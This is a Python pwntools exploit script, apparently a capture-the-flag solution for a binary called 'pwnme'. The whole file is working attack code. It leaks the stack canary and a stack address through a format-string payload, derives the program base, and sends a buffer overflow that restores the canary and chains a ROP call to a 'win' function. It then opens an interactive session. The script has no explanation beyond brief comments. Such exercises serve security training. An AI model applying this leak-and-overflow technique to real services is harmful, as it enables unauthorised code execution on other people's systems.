#!/usr/bin/env python3
from pwn import *
exe = './pwnme'

elf = context.binary = ELF('pwnme')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#### Exploit starts here ####

io = start()

# 10 might be stack addr 15 and 16 also look good for this 
# 13 seems to be carney

# canary double checked with gdb "canary" command

io.sendline(b'%13$p %10$p')
leaks = io.recv().strip().split(b'?',1)[1]
leaks = leaks.split()
print(leaks)
canary = leaks[0]
stack_addr = leaks[1]

canary = int(canary,16)
stack_addr = int(stack_addr,16)
base_addr = stack_addr - 0x1100


success(f"leaked canary {hex(canary)}")
success(f"Leaked stack addr {hex(stack_addr)}")
success(f"Base addr {hex(base_addr)}")

# offset for canary is 24
elf.address = base_addr
rop = ROP(elf)

# 8 bytes  

payload = b'A' * 24
payload += p64(canary)
payload += b"A" * 8
rop.raw(rop.ret)
rop.win(0xdeadbeefdeadbeef)
rop.win()
payload += rop.chain()
io.sendline(payload)
io.interactive()
